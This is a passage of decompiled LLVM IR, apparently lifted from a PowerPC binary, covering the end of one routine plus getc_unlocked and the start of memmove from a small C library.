dec_label_pc_1000d294:                            ; preds = %dec_label_pc_1000d20c, %dec_label_pc_1000d26c, %dec_label_pc_1000d244, %dec_label_pc_1000d288
  store i32 0, i32* @r29, align 4
  %v2_1000d298 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1000d298, i32* @r31, align 4
  br label %dec_label_pc_1000d29c

dec_label_pc_1000d29c:                            ; preds = %dec_label_pc_1000d2cc, %dec_label_pc_1000d294
  %v0_1000d2ac = phi i32 [ %v1_1000d2b8, %dec_label_pc_1000d2cc ], [ %v2_1000d298, %dec_label_pc_1000d294 ]
  %v1_1000d29c = inttoptr i32 %v0_1000d2ac to i32*
  %v2_1000d29c = load i32, i32* %v1_1000d29c, align 4
  store i32 %v2_1000d29c, i32* %r4.global-to-local, align 4
  %v0_1000d2a0 = load i32, i32* @r27, align 4
  store i32 %v0_1000d2a0, i32* %r3.global-to-local, align 4
  %v1_1000d2a4 = add i32 %v0_1000d2ac, 4
  %v2_1000d2a4 = inttoptr i32 %v1_1000d2a4 to i32*
  %v3_1000d2a4 = load i32, i32* %v2_1000d2a4, align 4
  store i32 %v3_1000d2a4, i32* %r5.global-to-local, align 4
  %v0_1000d2a8 = load i32, i32* @r26, align 4
  store i32 %v0_1000d2a8, i32* %ctr.global-to-local, align 4
  %v1_1000d2ac = add i32 %v0_1000d2ac, 8
  %v2_1000d2ac = inttoptr i32 %v1_1000d2ac to i32*
  %v3_1000d2ac = load i32, i32* %v2_1000d2ac, align 4
  store i32 %v3_1000d2ac, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000d2a8)
  %v0_1000d2b4 = load i32, i32* @r31, align 4
  %v1_1000d2b4 = add i32 %v0_1000d2b4, 4
  %v2_1000d2b4 = inttoptr i32 %v1_1000d2b4 to i32*
  %v3_1000d2b4 = load i32, i32* %v2_1000d2b4, align 4
  store i32 %v3_1000d2b4, i32* %r0.global-to-local, align 4
  %v1_1000d2b8 = add i32 %v0_1000d2b4, 12
  store i32 %v1_1000d2b8, i32* @r31, align 4
  %v0_1000d2bc = load i32, i32* @r29, align 4
  %v1_1000d2bc = load i32, i32* %r3.global-to-local, align 4
  %v2_1000d2bc = add i32 %v1_1000d2bc, %v0_1000d2bc
  store i32 %v2_1000d2bc, i32* @r29, align 4
  %v2_1000d2c0 = icmp slt i32 %v1_1000d2bc, %v3_1000d2b4
  %v4_1000d2c0 = icmp eq i32 %v1_1000d2bc, %v3_1000d2b4
  store i1 %v2_1000d2c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d2c0, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d2c4 = load i32, i32* @r30, align 4
  %v2_1000d2c4 = icmp ult i32 %v1_1000d2b8, %v1_1000d2c4
  %v3_1000d2c4 = icmp ugt i32 %v1_1000d2b8, %v1_1000d2c4
  %v4_1000d2c4 = icmp eq i32 %v1_1000d2b8, %v1_1000d2c4
  store i1 %v2_1000d2c4, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_1000d2c4, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_1000d2c4, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000d2c0, label %dec_label_pc_1000d2cc, label %dec_label_pc_1000d280

dec_label_pc_1000d2cc:                            ; preds = %dec_label_pc_1000d29c
  br i1 %v2_1000d2c4, label %dec_label_pc_1000d29c, label %dec_label_pc_1000d2d0

dec_label_pc_1000d2d0:                            ; preds = %dec_label_pc_1000d2cc, %dec_label_pc_1000d280
  %v0_1000d2d4 = phi i32 [ -1, %dec_label_pc_1000d280 ], [ %v2_1000d2bc, %dec_label_pc_1000d2cc ]
  store i32 %v0_1000cc24, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d2d4, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000d2d4

; uselistorder directives
  uselistorder i32 %v0_1000d2d4, { 1, 0 }
  uselistorder i32 %v1_1000d2bc, { 2, 1, 0 }
  uselistorder i32 %v1_1000d2b8, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_1000d2b4, { 1, 0, 2 }
  uselistorder i32 %v0_1000d2ac, { 0, 2, 1 }
  uselistorder i32 %v3_1000d260, { 1, 0, 2 }
  uselistorder i32 %v1_1000d220, { 1, 0 }
  uselistorder i32 %v2_1000d204, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000d1fc, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000d1f8, { 1, 0 }
  uselistorder i32 %v0_1000d270, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_1000d1c4, { 1, 2, 0 }
  uselistorder i32 %v1_1000d1a8, { 1, 0, 2 }
  uselistorder i32 %v2_1000d1a4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_1000d174, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_1000d144, { 2, 0, 1 }
  uselistorder i32 %v2_1000d140, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000d0b0, { 1, 0 }
  uselistorder i32 %v2_1000d014, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1000cfe8, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_1000cfb0, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000cfa8, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_1000cf74, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_1000cf64, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1000cf58, { 1, 0, 2 }
  uselistorder i32 %v1_1000cf3c, { 0, 3, 2, 1 }
  uselistorder i32 %v2_1000cef4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1000cee4, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000cec8, { 1, 0 }
  uselistorder i32 %v1_1000cea4, { 1, 0 }
  uselistorder i32 %v2_1000ce84, { 1, 0, 2 }
  uselistorder i32 %v0_1000ce2c, { 1, 0 }
  uselistorder i32 %v1_1000cc90, { 1, 0 }
  uselistorder i32 %v0_1000cd1c, { 2, 1, 0 }
  uselistorder i32 %v1_1000cc64, { 1, 0 }
  uselistorder i32 %v1_1000cc44, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 2, 4, 1, 3, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 4, 1, 6, 5, 7, 8, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 4, 5, 0, 6, 1, 7, 3, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 16, 15, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 29, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1 }
  uselistorder i32 45, { 1, 0 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_10012a98.363 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder label %dec_label_pc_1000d294, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d1f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d1a4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d190, { 1, 0 }
  uselistorder label %dec_label_pc_1000d16c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d140, { 1, 0 }
  uselistorder label %dec_label_pc_1000d12c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d110, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d0c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d0a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000d088, { 1, 0 }
  uselistorder label %dec_label_pc_1000cff8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cf94, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cf18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ceec, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000cecc, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce58, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd48, { 1, 0 }
  uselistorder label %dec_label_pc_1000cca0, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc74, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc68, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_1000d2e8 = load i32, i32* @lr, align 4
  store i32 %v0_1000d2e8, i32* %r0.global-to-local, align 4
  %v0_1000d2f0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000d2fc = add i32 %tmp, 16
  %v3_1000d2fc = inttoptr i32 %v2_1000d2fc to i32*
  %v4_1000d2fc = load i32, i32* %v3_1000d2fc, align 4
  store i32 %v4_1000d2fc, i32* %r9.global-to-local, align 4
  %v2_1000d300 = add i32 %tmp, 24
  %v3_1000d300 = inttoptr i32 %v2_1000d300 to i32*
  %v4_1000d300 = load i32, i32* %v3_1000d300, align 4
  store i32 %v4_1000d300, i32* %r0.global-to-local, align 4
  %v2_1000d304 = icmp ult i32 %v4_1000d2fc, %v4_1000d300
  br i1 %v2_1000d304, label %dec_label_pc_1000d36c, label %dec_label_pc_1000d30c

dec_label_pc_1000d30c:                            ; preds = %entry
  %v3_1000d30c = load i16, i16* %arg1, align 2
  %v4_1000d30c = zext i16 %v3_1000d30c to i32
  %v1_1000d310 = and i32 %v4_1000d30c, 131
  store i32 %v1_1000d310, i32* %r0.global-to-local, align 4
  %v2_1000d314 = icmp ugt i32 %v1_1000d310, 128
  br i1 %v2_1000d314, label %dec_label_pc_1000d32c, label %dec_label_pc_1000d31c

dec_label_pc_1000d31c:                            ; preds = %dec_label_pc_1000d30c
  store i32 268489508, i32* @lr, align 4
  %v3_1000d320 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_1000d2fc)
  store i32 %v3_1000d320, i32* %r3.global-to-local, align 4
  %v3_1000d324 = icmp eq i32 %v3_1000d320, 0
  br i1 %v3_1000d324, label %dec_label_pc_1000d31c.dec_label_pc_1000d32c_crit_edge, label %dec_label_pc_1000d408

dec_label_pc_1000d31c.dec_label_pc_1000d32c_crit_edge: ; preds = %dec_label_pc_1000d31c
  %v0_1000d32c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d32c

dec_label_pc_1000d32c:                            ; preds = %dec_label_pc_1000d31c.dec_label_pc_1000d32c_crit_edge, %dec_label_pc_1000d30c
  %v2_1000d38c = phi i32 [ %v0_1000d32c.pre, %dec_label_pc_1000d31c.dec_label_pc_1000d32c_crit_edge ], [ %tmp, %dec_label_pc_1000d30c ]
  %v1_1000d32c = inttoptr i32 %v2_1000d38c to i16*
  %v2_1000d32c = load i16, i16* %v1_1000d32c, align 2
  %v3_1000d32c = zext i16 %v2_1000d32c to i32
  %v1_1000d330 = and i32 %v3_1000d32c, 2
  store i32 %v1_1000d330, i32* %r0.global-to-local, align 4
  %v3_1000d330 = icmp eq i32 %v1_1000d330, 0
  br i1 %v3_1000d330, label %dec_label_pc_1000d35c, label %dec_label_pc_1000d338

dec_label_pc_1000d338:                            ; preds = %dec_label_pc_1000d32c
  %v1_1000d338 = call i32 @__asm_rlwinm(i32 %v3_1000d32c, i32 2, i32 29, i32 29)
  %v1_1000d33c = load i32, i32* @r31, align 4
  %v2_1000d33c = add i32 %v1_1000d33c, %v1_1000d338
  store i32 %v2_1000d33c, i32* %r9.global-to-local, align 4
  %v1_1000d340 = add i32 %v2_1000d33c, 39
  %v2_1000d340 = inttoptr i32 %v1_1000d340 to i8*
  %v3_1000d340 = load i8, i8* %v2_1000d340, align 1
  %v4_1000d340 = zext i8 %v3_1000d340 to i32
  store i32 %v4_1000d340, i32* %r0.global-to-local, align 4
  %v1_1000d344 = add nsw i32 %v3_1000d32c, -1
  store i32 %v1_1000d344, i32* %r9.global-to-local, align 4
  %v1_1000d348 = trunc i32 %v1_1000d344 to i16
  %v3_1000d348 = inttoptr i32 %v1_1000d33c to i16*
  store i16 %v1_1000d348, i16* %v3_1000d348, align 2
  %v0_1000d34c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d34c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000d354 = load i32, i32* @r31, align 4
  %v2_1000d354 = add i32 %v1_1000d354, 40
  %v3_1000d354 = inttoptr i32 %v2_1000d354 to i32*
  store i32 0, i32* %v3_1000d354, align 4
  br label %dec_label_pc_1000d40c

dec_label_pc_1000d35c:                            ; preds = %dec_label_pc_1000d32c
  %v1_1000d35c = add i32 %v2_1000d38c, 16
  %v2_1000d35c = inttoptr i32 %v1_1000d35c to i32*
  %v3_1000d35c = load i32, i32* %v2_1000d35c, align 4
  store i32 %v3_1000d35c, i32* %r9.global-to-local, align 4
  %v1_1000d360 = add i32 %v2_1000d38c, 20
  %v2_1000d360 = inttoptr i32 %v1_1000d360 to i32*
  %v3_1000d360 = load i32, i32* %v2_1000d360, align 4
  store i32 %v3_1000d360, i32* %r0.global-to-local, align 4
  %v4_1000d364 = icmp eq i32 %v3_1000d360, %v3_1000d35c
  br i1 %v4_1000d364, label %dec_label_pc_1000d378, label %dec_label_pc_1000d36c

dec_label_pc_1000d36c:                            ; preds = %dec_label_pc_1000d35c, %entry
  %v1_1000d3e07 = phi i32 [ %v2_1000d38c, %dec_label_pc_1000d35c ], [ %tmp, %entry ]
  %v0_1000d36c = phi i32 [ %v3_1000d35c, %dec_label_pc_1000d35c ], [ %v4_1000d2fc, %entry ]
  %v1_1000d36c = inttoptr i32 %v0_1000d36c to i8*
  %v2_1000d36c = load i8, i8* %v1_1000d36c, align 1
  %v3_1000d36c = zext i8 %v2_1000d36c to i32
  store i32 %v3_1000d36c, i32* %r3.global-to-local, align 4
  %v1_1000d370 = add i32 %v0_1000d36c, 1
  store i32 %v1_1000d370, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d3e0

dec_label_pc_1000d378:                            ; preds = %dec_label_pc_1000d35c
  %v1_1000d378 = add i32 %v2_1000d38c, 4
  %v2_1000d378 = inttoptr i32 %v1_1000d378 to i32*
  %v3_1000d378 = load i32, i32* %v2_1000d378, align 4
  store i32 %v3_1000d378, i32* %r0.global-to-local, align 4
  %v3_1000d37c = icmp eq i32 %v3_1000d378, -2
  br i1 %v3_1000d37c, label %dec_label_pc_1000d384, label %dec_label_pc_1000d394

dec_label_pc_1000d384:                            ; preds = %dec_label_pc_1000d378
  %v1_1000d384 = or i32 %v3_1000d32c, 4
  store i32 %v1_1000d384, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000d38c = trunc i32 %v1_1000d384 to i16
  store i16 %v1_1000d38c, i16* %v1_1000d32c, align 2
  br label %dec_label_pc_1000d40c

dec_label_pc_1000d394:                            ; preds = %dec_label_pc_1000d378
  %v1_1000d394 = and i32 %v3_1000d32c, 768
  store i32 %v1_1000d394, i32* %r0.global-to-local, align 4
  %v3_1000d394 = icmp eq i32 %v1_1000d394, 0
  br i1 %v3_1000d394, label %dec_label_pc_1000d3a8, label %dec_label_pc_1000d39c

dec_label_pc_1000d39c:                            ; preds = %dec_label_pc_1000d394
  store i32 ptrtoint (i32** @global_var_100234f8.287 to i32), i32* %r3.global-to-local, align 4
  store i32 268489640, i32* @lr, align 4
  %v4_1000d3a4 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_100234f8.287 to i16*), i32 %v3_1000d35c)
  store i32 %v4_1000d3a4, i32* %r3.global-to-local, align 4
  %v0_1000d3a8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d3a8

dec_label_pc_1000d3a8:                            ; preds = %dec_label_pc_1000d394, %dec_label_pc_1000d39c
  %v0_1000d3e8 = phi i32 [ %v2_1000d38c, %dec_label_pc_1000d394 ], [ %v0_1000d3a8.pre, %dec_label_pc_1000d39c ]
  %v1_1000d3a8 = add i32 %v0_1000d3e8, 8
  %v2_1000d3a8 = inttoptr i32 %v1_1000d3a8 to i32*
  %v3_1000d3a8 = load i32, i32* %v2_1000d3a8, align 4
  store i32 %v3_1000d3a8, i32* %r9.global-to-local, align 4
  %v1_1000d3ac = add i32 %v0_1000d3e8, 12
  %v2_1000d3ac = inttoptr i32 %v1_1000d3ac to i32*
  %v3_1000d3ac = load i32, i32* %v2_1000d3ac, align 4
  store i32 %v3_1000d3ac, i32* %r0.global-to-local, align 4
  %v4_1000d3b0 = icmp eq i32 %v3_1000d3ac, %v3_1000d3a8
  br i1 %v4_1000d3b0, label %dec_label_pc_1000d3e8, label %dec_label_pc_1000d3b8

dec_label_pc_1000d3b8:                            ; preds = %dec_label_pc_1000d3a8
  %v2_1000d3b8 = add i32 %v0_1000d3e8, 24
  %v3_1000d3b8 = inttoptr i32 %v2_1000d3b8 to i32*
  store i32 %v3_1000d3a8, i32* %v3_1000d3b8, align 4
  %v0_1000d3bc = load i32, i32* @r31, align 4
  store i32 %v0_1000d3bc, i32* %r3.global-to-local, align 4
  store i32 268489668, i32* @lr, align 4
  %v3_1000d3c0 = call i32 @__stdio_rfill(i32 %v0_1000d3bc, i32 %v3_1000d3a8)
  store i32 %v3_1000d3c0, i32* %r3.global-to-local, align 4
  %v3_1000d3c4 = icmp eq i32 %v3_1000d3c0, 0
  br i1 %v3_1000d3c4, label %dec_label_pc_1000d408, label %dec_label_pc_1000d3cc

dec_label_pc_1000d3cc:                            ; preds = %dec_label_pc_1000d3b8
  %v0_1000d3cc = load i32, i32* @r31, align 4
  %v1_1000d3cc = add i32 %v0_1000d3cc, 20
  %v2_1000d3cc = inttoptr i32 %v1_1000d3cc to i32*
  %v3_1000d3cc = load i32, i32* %v2_1000d3cc, align 4
  store i32 %v3_1000d3cc, i32* %r0.global-to-local, align 4
  %v1_1000d3d0 = add i32 %v0_1000d3cc, 16
  %v2_1000d3d0 = inttoptr i32 %v1_1000d3d0 to i32*
  %v3_1000d3d0 = load i32, i32* %v2_1000d3d0, align 4
  store i32 %v3_1000d3d0, i32* %r9.global-to-local, align 4
  %v2_1000d3d4 = add i32 %v0_1000d3cc, 24
  %v3_1000d3d4 = inttoptr i32 %v2_1000d3d4 to i32*
  store i32 %v3_1000d3cc, i32* %v3_1000d3d4, align 4
  %v0_1000d3d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d3d8 = add i32 %v0_1000d3d8, 1
  store i32 %v1_1000d3d8, i32* %r0.global-to-local, align 4
  %v1_1000d3dc = inttoptr i32 %v0_1000d3d8 to i8*
  %v2_1000d3dc = load i8, i8* %v1_1000d3dc, align 1
  %v3_1000d3dc = zext i8 %v2_1000d3dc to i32
  store i32 %v3_1000d3dc, i32* %r3.global-to-local, align 4
  %v1_1000d3e0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d3e0

dec_label_pc_1000d3e0:                            ; preds = %dec_label_pc_1000d36c, %dec_label_pc_1000d3cc
  %v1_1000d3e0 = phi i32 [ %v1_1000d3e07, %dec_label_pc_1000d36c ], [ %v1_1000d3e0.pre, %dec_label_pc_1000d3cc ]
  %v0_1000d3e0 = phi i32 [ %v1_1000d370, %dec_label_pc_1000d36c ], [ %v1_1000d3d8, %dec_label_pc_1000d3cc ]
  %v2_1000d3e0 = add i32 %v1_1000d3e0, 16
  %v3_1000d3e0 = inttoptr i32 %v2_1000d3e0 to i32*
  store i32 %v0_1000d3e0, i32* %v3_1000d3e0, align 4
  br label %dec_label_pc_1000d40c

dec_label_pc_1000d3e8:                            ; preds = %dec_label_pc_1000d3a8
  %v1_1000d3e8 = inttoptr i32 %v0_1000d3e8 to i16*
  store i32 %v0_1000d3e8, i32* %r3.global-to-local, align 4
  %v2_1000d3ec = ptrtoint i8* %stack_var_-24 to i32
  store i32 268489720, i32* @lr, align 4
  %v5_1000d3f4 = call i32 @__stdio_READ(i16* %v1_1000d3e8, i32 %v2_1000d3ec, i32 1)
  store i32 %v5_1000d3f4, i32* %r3.global-to-local, align 4
  %v3_1000d3f8 = icmp eq i32 %v5_1000d3f4, 0
  br i1 %v3_1000d3f8, label %dec_label_pc_1000d408, label %dec_label_pc_1000d400

dec_label_pc_1000d400:                            ; preds = %dec_label_pc_1000d3e8
  %v3_1000d400 = load i8, i8* %stack_var_-24, align 1
  %v4_1000d400 = sext i8 %v3_1000d400 to i32
  store i32 %v4_1000d400, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d40c

dec_label_pc_1000d408:                            ; preds = %dec_label_pc_1000d31c, %dec_label_pc_1000d3e8, %dec_label_pc_1000d3b8
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d40c

dec_label_pc_1000d40c:                            ; preds = %dec_label_pc_1000d400, %dec_label_pc_1000d3e0, %dec_label_pc_1000d384, %dec_label_pc_1000d338, %dec_label_pc_1000d408
  store i32 %v0_1000d2e8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d2f0, i32* @r31, align 4
  %v0_1000d41c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000d41c

; uselistorder directives
  uselistorder i32 %v0_1000d3e8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1000d36c, { 1, 0 }
  uselistorder i32 %v3_1000d35c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000d33c, { 1, 0 }
  uselistorder i32 %v3_1000d32c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_1000d38c, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 (i16*, i32)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* bitcast (i32** @global_var_100234f8.287 to i16*), { 1, 0 }
  uselistorder i16* @global_var_100231d0.275, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d40c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000d408, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d3e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3a8, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_1000d420 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_1000d428 = load i32, i32* @r5, align 4
  store i32 %v0_1000d428, i32* @r11, align 4
  br i1 %v2_1000d420, label %dec_label_pc_1000d434, label %dec_label_pc_1000d430

dec_label_pc_1000d430:                            ; preds = %entry
  %v0_1000d430 = call i32 @memcpy()
  store i32 %v0_1000d430, i32* @r3, align 4
  %v0_1000d434.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000d434

dec_label_pc_1000d434:                            ; preds = %entry, %dec_label_pc_1000d430
  %v0_1000d434 = phi i32 [ %v0_1000d428, %entry ], [ %v0_1000d434.pre, %dec_label_pc_1000d430 ]
  %v1_1000d434 = call i32 @__asm_rlwinm.(i32 %v0_1000d434, i32 29, i32 3, i32 31)
  store i32 %v1_1000d434, i32* %r9.global-to-local, align 4
  %v4_1000d434 = icmp eq i32 %v1_1000d434, 0
  %v1_1000d438 = load i32, i32* @r5, align 4
  %v2_1000d438 = add i32 %v1_1000d438, %arg2
  store i32 %v2_1000d438, i32* %r4.global-to-local, align 4
  %v0_1000d43c = load i32, i32* @r3, align 4
  %v2_1000d43c = add i32 %v0_1000d43c, %v1_1000d438
  store i32 %v2_1000d43c, i32* %r10.global-to-local, align 4
  br i1 %v4_1000d434, label %dec_label_pc_1000d464, label %dec_label_pc_1000d444

dec_label_pc_1000d444:                            ; preds = %dec_label_pc_1000d434
  %v1_1000d444 = urem i32 %v2_1000d43c, 4
  %v3_1000d444 = icmp eq i32 %v1_1000d444, 0
  br i1 %v3_1000d444, label %dec_label_pc_1000d44c, label %dec_label_pc_1000d498

dec_label_pc_1000d44c:                            ; preds = %dec_label_pc_1000d4b0.dec_label_pc_1000d44c_crit_edge, %dec_label_pc_1000d444
  %v1_1000d458.pre = phi i32 [ %v1_1000d458.pre.pre, %dec_label_pc_1000d4b0.dec_label_pc_1000d44c_crit_edge ], [ %v2_1000d43c, %dec_label_pc_1000d444 ]
  %v0_1000d44c = phi i32 [ %v1_1000d4b0, %dec_label_pc_1000d4b0.dec_label_pc_1000d44c_crit_edge ], [ %v1_1000d434, %dec_label_pc_1000d444 ]
  store i32 %v0_1000d44c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d450

dec_label_pc_1000d450:                            ; preds = %dec_label_pc_1000d450, %dec_label_pc_1000d44c
  %v1_1000d458 = phi i32 [ %v2_1000d45c, %dec_label_pc_1000d450 ], [ %v1_1000d458.pre, %dec_label_pc_1000d44c ]
  %v0_1000d450 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d450 = add i32 %v0_1000d450, -4
  %v2_1000d450 = inttoptr i32 %v1_1000d450 to i32*
  %v3_1000d450 = load i32, i32* %v2_1000d450, align 4
  %v1_1000d454 = add i32 %v0_1000d450, -8
  %v2_1000d454 = inttoptr i32 %v1_1000d454 to i32*
  %v3_1000d454 = load i32, i32* %v2_1000d454, align 4
  store i32 %v3_1000d454, i32* %r9.global-to-local, align 4
  store i32 %v1_1000d454, i32* %r4.global-to-local, align 4
  %v2_1000d458 = add i32 %v1_1000d458, -4
  %v3_1000d458 = inttoptr i32 %v2_1000d458 to i32*
  store i32 %v3_1000d450, i32* %v3_1000d458, align 4
  %v0_1000d45c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d45c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d45c = add i32 %v1_1000d45c, -8
  %v3_1000d45c = inttoptr i32 %v2_1000d45c to i32*
  store i32 %v0_1000d45c, i32* %v3_1000d45c, align 4
  store i32 %v2_1000d45c, i32* %r10.global-to-local, align 4
  %v0_1000d460 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d460 = add i32 %v0_1000d460, -1
  store i32 %v1_1000d460, i32* %ctr.global-to-local, align 4
  %v2_1000d460 = icmp eq i32 %v1_1000d460, 0
  br i1 %v2_1000d460, label %dec_label_pc_1000d464, label %dec_label_pc_1000d450

dec_label_pc_1000d464:                            ; preds = %dec_label_pc_1000d450, %dec_label_pc_1000d4b0, %dec_label_pc_1000d434
  %v0_1000d464 = load i32, i32* @r11, align 4
  %v1_1000d464 = urem i32 %v0_1000d464, 8
  store i32 %v1_1000d464, i32* %r5.global-to-local, align 4
